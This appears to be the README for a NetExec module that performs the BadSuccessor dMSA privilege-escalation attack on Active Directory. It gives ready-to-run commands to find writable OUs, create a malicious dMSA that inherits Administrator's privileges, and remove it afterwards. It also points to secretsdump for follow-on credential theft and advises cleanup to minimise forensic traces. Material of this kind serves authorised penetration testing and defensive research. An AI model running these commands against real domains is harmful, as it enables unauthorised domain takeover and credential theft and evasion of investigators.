# BadSuccessor Module Usage Examples

The BadSuccessor module implements the BadSuccessor attack capability for NetExec, allowing you to exploit dMSA (Delegated Managed Service Account) privilege escalation vulnerabilities in Active Directory environments.

## Overview

This module implements three main actions:
- **check**: Check domain functional level, schema, and enumerate vulnerable OUs for dMSA creation
- **attack**: Perform the BadSuccessor attack by creating a malicious dMSA
- **cleanup**: Clean up a created dMSA

## Prerequisites

- Windows Server 2025 domain functional level (or compatible schema)
- Valid LDAP credentials with appropriate permissions
- Target must support dMSA objects

## Usage Examples

### 1. Check for Vulnerability (Default Action)

```bash
# Basic check - scans for vulnerable OUs and verifies schema support
nxc ldap <target> -u <username> -p <password> -M badsuccessor

# Equivalent explicit check
nxc ldap <target> -u <username> -p <password> -M badsuccessor -o ACTION=check
```

This will:
- Check domain functional level
- Verify Windows Server 2025 dMSA schema elements
- Enumerate OUs where you have CreateChild permissions for dMSA objects
- Show potential attack targets

### 2. Perform the Attack

```bash
# Attack with automatic OU discovery
nxc ldap <target> -u <username> -p <password> -M badsuccessor -o ACTION=attack TARGET_USER=Administrator

# Attack with specific OU and custom dMSA name
nxc ldap <target> -u <username> -p <password> -M badsuccessor -o ACTION=attack TARGET_USER=Administrator DMSA_NAME=my_evil_dmsa OU_DN="OU=Computers,DC=domain,DC=com"
```

This will:
- Create a malicious dMSA in the specified (or auto-discovered) OU
- Set the predecessor link to the target user
- Grant the dMSA the privileges of the target user

### 3. Cleanup

```bash
# Remove the created dMSA
nxc ldap <target> -u <username> -p <password> -M badsuccessor -o ACTION=cleanup DMSA_FULL_DN="CN=evil_dmsa,OU=Computers,DC=domain,DC=com"
```

## Module Options

| Option | Description | Required | Default |
|--------|-------------|----------|---------|
| `ACTION` | Action to perform: check, attack, cleanup | No | check |
| `TARGET_USER` | Username to impersonate (e.g., Administrator) | Yes (for attack) | - |
| `DMSA_NAME` | Name for the malicious dMSA | No | evil_dmsa |
| `OU_DN` | Distinguished Name of OU for dMSA creation | No | Auto-discovered |
| `DMSA_FULL_DN` | Full DN of dMSA to remove | Yes (for cleanup) | - |

## Attack Flow

1. **Reconnaissance**: Use the `check` action to identify vulnerable OUs and verify schema support
2. **Exploitation**: Use the `attack` action to create a malicious dMSA linked to a high-privilege user
3. **Post-Exploitation**: Authenticate as the dMSA to gain the target user's privileges
4. **Cleanup**: Use the `cleanup` action to remove traces

## Example Attack Scenario

```bash
# Step 1: Check for vulnerability
nxc ldap 192.168.1.10 -u lowpriv -p password123 -M badsuccessor

# Step 2: Perform attack (if vulnerable OUs found)
nxc ldap 192.168.1.10 -u lowpriv -p password123 -M badsuccessor -o ACTION=attack TARGET_USER=Administrator

# Step 3: Use the created dMSA for further exploitation
# (Use other tools like secretsdump.py with the dMSA credentials)

# Step 4: Cleanup
nxc ldap 192.168.1.10 -u lowpriv -p password123 -M badsuccessor -o ACTION=cleanup DMSA_FULL_DN="CN=evil_dmsa,OU=SomeOU,DC=domain,DC=com"
```

## Security Considerations

- This module modifies Active Directory objects and may trigger security alerts
- The `opsec_safe` flag is set to `True`, but any AD modification carries detection risk
- Always clean up created objects to minimize forensic traces
- Ensure you have proper authorization before using this in any environment

## Troubleshooting

- **Schema not found**: Domain may not be at Windows Server 2025 functional level
- **Permission denied**: User may lack CreateChild permissions on target OUs
- **No writable OUs found**: Current user may need higher privileges or different OU permissions
- **dMSA creation failed**: Check domain functional level, schema support, and LDAP connectivity

## References

- [Akamai BadSuccessor Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Original PowerShell Implementation](https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1)
